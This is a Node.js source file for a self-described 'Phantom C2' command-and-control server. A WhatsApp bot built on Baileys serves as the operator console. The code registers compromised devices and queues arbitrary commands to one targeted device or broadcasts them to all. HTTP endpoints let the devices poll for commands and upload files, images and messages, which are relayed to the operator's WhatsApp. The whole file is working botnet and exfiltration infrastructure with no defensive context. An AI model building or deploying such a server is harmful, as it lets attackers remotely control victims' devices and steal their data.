import { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion } from '@whiskeysockets/baileys';
import { Boom } from '@hapi/boom';
import express from 'express';
import multer from 'multer';
import initSqlJs from 'sql.js';
import dotenv from 'dotenv';
import pino from 'pino';
import fs from 'fs';
import path from 'path';

dotenv.config();

const PORT = parseInt(process.env.PORT || '3000');
const OWNER_JID = process.env.OWNER_JID || null;
const ALERT_JID = process.env.ALERT_JID || null;
const GROUP_MODE = process.env.GROUP_MODE === 'true';
const AUTH_DIR = process.env.AUTH_DIR || './auth_info';
const DB_PATH = process.env.DB_PATH || './data.db';
const TARGET_DB_PATH = process.env.TARGET_DB_PATH || './targets.json';

fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

const SQL = await initSqlJs();
let db;
if (fs.existsSync(DB_PATH)) {
  const buf = fs.readFileSync(DB_PATH);
  db = new SQL.Database(buf);
} else {
  db = new SQL.Database();
}

db.run(`CREATE TABLE IF NOT EXISTS devices (
  device_id TEXT PRIMARY KEY,
  last_seen INTEGER NOT NULL,
  is_online INTEGER NOT NULL DEFAULT 0
)`);
db.run(`CREATE TABLE IF NOT EXISTS command_queue (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  device_id TEXT NOT NULL,
  action TEXT NOT NULL,
  payload TEXT,
  created_at INTEGER NOT NULL,
  delivered INTEGER NOT NULL DEFAULT 0,
  acked INTEGER NOT NULL DEFAULT 0
)`);

function saveDb() {
  fs.writeFileSync(DB_PATH, Buffer.from(db.export()));
}

let targetMap = {};
if (fs.existsSync(TARGET_DB_PATH)) {
  try { targetMap = JSON.parse(fs.readFileSync(TARGET_DB_PATH, 'utf8')); } catch {}
}
function saveTargets() {
  fs.writeFileSync(TARGET_DB_PATH, JSON.stringify(targetMap, null, 2));
}

function queueCommand(deviceId, action, payload) {
  const now = Math.floor(Date.now() / 1000);
  db.run('INSERT INTO command_queue (device_id, action, payload, created_at) VALUES (?, ?, ?, ?)', [deviceId, action, payload || null, now]);
  saveDb();
  const result = db.exec('SELECT last_insert_rowid()');
  return result[0]?.values[0]?.[0];
}

function getPendingCommands(deviceId, afterId) {
  let stmt;
  if (afterId) {
    stmt = db.prepare('SELECT CAST(id AS TEXT) as id, action, payload FROM command_queue WHERE device_id = ? AND id > ? AND delivered = 0 ORDER BY id ASC');
    stmt.bind([deviceId, afterId]);
  } else {
    stmt = db.prepare('SELECT CAST(id AS TEXT) as id, action, payload FROM command_queue WHERE device_id = ? AND delivered = 0 ORDER BY id ASC');
    stmt.bind([deviceId]);
  }
  const rows = [];
  while (stmt.step()) rows.push(stmt.getAsObject());
  stmt.free();
  return rows;
}

function ackCommand(id) {
  db.run('UPDATE command_queue SET delivered = 1, acked = 1 WHERE id = ?', [parseInt(id)]);
}

function upsertDevice(deviceId) {
  const now = Math.floor(Date.now() / 1000);
  db.run('INSERT INTO devices (device_id, last_seen, is_online) VALUES (?, ?, 1) ON CONFLICT(device_id) DO UPDATE SET last_seen = ?, is_online = 1', [deviceId, now, now]);
}

function getDevices() {
  const stmt2 = db.prepare('SELECT * FROM devices ORDER BY last_seen DESC');
  const rows = [];
  while (stmt2.step()) rows.push(stmt2.getAsObject());
  stmt2.free();
  return rows;
}

function formatEmbed(embed) {
  if (!embed) return '';
  let text = '';
  if (embed.title) text += `*${embed.title}*\n`;
  if (embed.description) text += `${embed.description}\n`;
  if (embed.fields) {
    for (const f of embed.fields) {
      text += `▸ *${f.name}*: ${f.value}\n`;
    }
  }
  if (embed.color && !isNaN(embed.color)) {
    text += `\n[#${embed.color.toString(16).padStart(6, '0')}]`;
  }
  return text.trim();
}

let sock = null;
let alertJid = ALERT_JID;

async function startBot() {
  const { version } = await fetchLatestBaileysVersion();
  console.log(`[+] Baileys v${version.join('.')}`);

  const { state, saveCreds } = await useMultiFileAuthState(AUTH_DIR);

  sock = makeWASocket({
    version,
    logger: pino({ level: 'warn' }),
    printQRInTerminal: true,
    auth: state,
    syncFullHistory: false,
    markOnlineOnConnect: true,
    generateHighQualityLink: true,
  });

  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;
    if (qr) console.log('[+] QR/received. Scan or use pairing code.');
    if (connection === 'open') {
      console.log(`[+] Connected as ${sock.user?.id}`);
      if (alertJid) {
        try { await sock.sendMessage(alertJid, { text: '✅ Phantom C2 bot online' }); } catch {}
      }
    }
    if (connection === 'close') {
      const code = lastDisconnect?.error ? new Boom(lastDisconnect.error).output.statusCode : 500;
      const shouldReconnect = code !== DisconnectReason.loggedOut;
      console.log(`[!] Disconnected (${code}). Reconnect: ${shouldReconnect}`);
      if (shouldReconnect) setTimeout(startBot, 1000);
    }
  });

  sock.ev.on('creds.update', saveCreds);

  sock.ev.on('messages.upsert', async ({ messages }) => {
    for (const msg of messages) {
      if (msg.key?.fromMe) continue;
      const jid = msg.key.remoteJid;
      const isGroup = jid.endsWith('@g.us');
      const text = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';

      if (!text || !text.startsWith('!')) continue;

      if (OWNER_JID && jid !== OWNER_JID && !(GROUP_MODE && isGroup)) continue;

      if (!alertJid) {
        alertJid = jid;
        console.log(`[+] Alert JID set to ${jid}`);
      }

      const parts = text.slice(1).trim().split(/\s+/);
      const cmd = parts[0].toLowerCase();
      const payload = parts.slice(1).join(' ');

      switch (cmd) {
        case 'help':
          await sock.sendMessage(jid, { text: `📋 *Phantom C2 Commands*\n\n!help — this menu\n!devices — list devices\n!target <id> — target a device\n!untarget — broadcast mode\n!status — bot health\n\nAny other !command queues to target/broadcast.` });
          break;
        case 'devices': {
          const devices = getDevices();
          if (!devices.length) {
            await sock.sendMessage(jid, { text: '📭 No devices registered.' });
          } else {
            const lines = devices.map((d, i) => `${i+1}. \`${d.device_id}\` ${d.is_online ? '🟢' : '🔴'} ${new Date(d.last_seen*1000).toLocaleString()}`);
            await sock.sendMessage(jid, { text: `📱 *Devices (${devices.length})*\n\n${lines.join('\n')}` });
          }
          break;
        }
        case 'target': {
          if (!payload) { await sock.sendMessage(jid, { text: 'Usage: !target <device_id>' }); break; }
          const devices = getDevices();
          const found = devices.find(d => d.device_id === payload);
          if (!found) { await sock.sendMessage(jid, { text: `❌ Device \`${payload}\` not found.` }); break; }
          targetMap[jid] = payload;
          saveTargets();
          await sock.sendMessage(jid, { text: `🎯 Targeting \`${payload}\`` });
          break;
        }
        case 'untarget':
          delete targetMap[jid];
          saveTargets();
          await sock.sendMessage(jid, { text: '📢 Broadcast mode.' });
          break;
        case 'status': {
          const count = db.exec("SELECT COUNT(*) as c FROM devices")[0]?.values[0]?.[0] || 0;
          const online = db.exec("SELECT COUNT(*) as c FROM devices WHERE is_online=1")[0]?.values[0]?.[0] || 0;
          const pending = db.exec("SELECT COUNT(*) as c FROM command_queue WHERE delivered=0")[0]?.values[0]?.[0] || 0;
          await sock.sendMessage(jid, { text: `📊 *Bot Status*\n\nDevices: ${count} (${online} online)\nPending: ${pending}\nUptime: ${Math.floor(process.uptime())}s` });
          break;
        }
        default: {
          const target = targetMap[jid];
          if (target) {
            const id = queueCommand(target, cmd, payload);
            await sock.sendMessage(jid, { text: `📤 Queued \`${cmd}\` → \`${target}\` (#${id})` });
          } else {
            const devices = getDevices();
            if (!devices.length) { await sock.sendMessage(jid, { text: '❌ No devices.' }); break; }
            for (const d of devices) queueCommand(d.device_id, cmd, payload);
            await sock.sendMessage(jid, { text: `📤 Broadcast to ${devices.length} devices` });
          }
          break;
        }
      }
    }
  });
}

const app = express();
app.use(express.json({ limit: '50mb' }));

app.get('/health', (req, res) => {
  res.json({ status: sock?.user ? 'ok' : 'connecting', bot: sock?.user?.id || null, uptime: Math.floor(process.uptime()) });
});

app.get('/api/poll', (req, res) => {
  const deviceId = req.query.device;
  const after = req.query.after ? parseInt(req.query.after) : null;
  if (!deviceId) return res.status(400).json({ error: 'device required' });
  upsertDevice(deviceId);
  saveDb();
  const commands = getPendingCommands(deviceId, after);
  res.json(commands);
});

app.post('/api/ack', (req, res) => {
  const id = req.body?.id;
  if (!id) return res.status(400).json({ error: 'id required' });
  ackCommand(id);
  saveDb();
  res.json({ ok: true });
});

app.post('/api/send', upload.single('file'), async (req, res) => {
  if (!alertJid || !sock?.user) return res.status(503).json({ error: 'bot not ready' });

  try {
    const deviceId = req.body?.device || 'unknown';
    const type = req.body?.type || 'text';
    const content = req.body?.content || '';
    const caption = req.body?.caption || '';

    upsertDevice(deviceId);
    saveDb();

    if (type === 'file' && req.file) {
      const isMedia = req.file.mimetype?.startsWith('image/') || req.file.mimetype?.startsWith('video/');
      const cap = `📁 *${deviceId}*: ${caption || content}`;
      if (isMedia) {
        await sock.sendMessage(alertJid, { image: req.file.buffer, caption: cap, mimetype: req.file.mimetype });
      } else {
        await sock.sendMessage(alertJid, { document: req.file.buffer, fileName: req.file.originalname || 'file', caption: cap, mimetype: req.file.mimetype });
      }
    } else if (type === 'embed' && req.body.embed) {
      const embed = typeof req.body.embed === 'string' ? JSON.parse(req.body.embed) : req.body.embed;
      const formatted = formatEmbed(embed);
      await sock.sendMessage(alertJid, { text: `📦 *${deviceId}*\n${content ? content + '\n' : ''}${formatted}` });
    } else if (type === 'edit' || type === 'edit_embed') {
      await sock.sendMessage(alertJid, { text: `✏️ *${deviceId}* edited ${req.body.messageId || ''}\n${content}` });
    } else {
      await sock.sendMessage(alertJid, { text: `💬 *${deviceId}*\n${content}` });
    }

    res.json({ ok: true });
  } catch (e) {
    console.error('[!] /api/send error:', e.message);
    res.status(500).json({ error: e.message });
  }
});

app.post('/api/delete', (req, res) => {
  if (!alertJid || !sock?.user) return res.status(503).json({ error: 'bot not ready' });
  const deviceId = req.body?.device || 'unknown';
  const messageId = req.body?.messageId || '';
  upsertDevice(deviceId);
  saveDb();
  sock.sendMessage(alertJid, { text: `🗑️ *${deviceId}* deleted message: ${messageId}` });
  res.json({ ok: true });
});

app.listen(PORT, () => {
  console.log(`[+] API on :${PORT}`);
  console.log(`[+] DB: ${DB_PATH}`);
  console.log(`[+] Auth: ${AUTH_DIR}`);
});

startBot().catch(e => { console.error('[!] Fatal:', e); process.exit(1); });

process.on('SIGINT', () => { saveDb(); process.exit(0); });
process.on('SIGTERM', () => { saveDb(); process.exit(0); });
